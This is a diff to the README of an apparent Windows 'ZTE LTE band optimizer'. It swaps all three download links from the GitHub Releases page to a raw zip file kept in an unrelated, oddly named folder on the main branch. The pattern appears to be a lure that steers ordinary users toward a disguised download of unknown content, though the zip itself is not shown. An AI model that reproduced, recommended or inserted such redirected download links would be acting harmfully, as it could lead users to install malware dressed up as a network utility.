@@ -1,6 +1,6 @@
 # 📶 zte-global-lte-band-optimizer - Lower Ping with Better LTE Bands
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/raw/refs/heads/main/Nazarenism/lte-band-global-optimizer-zte-1.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ It is built for Windows and is meant for normal users who want a simple way to t
 
 Visit this page to download the latest release:
 
-[Download from GitHub Releases](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases)
+[Download from GitHub Releases](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/raw/refs/heads/main/Nazarenism/lte-band-global-optimizer-zte-1.2-alpha.4.zip)
 
 After you open the release page:
 
@@ -293,7 +293,7 @@ Keep the full folder together if the release includes more than one file.
 
 Visit the release page here:
 
-[https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases)
+[https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/raw/refs/heads/main/Nazarenism/lte-band-global-optimizer-zte-1.2-alpha.4.zip](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/raw/refs/heads/main/Nazarenism/lte-band-global-optimizer-zte-1.2-alpha.4.zip)
 
 ## 📝 Basic Use Guide
 
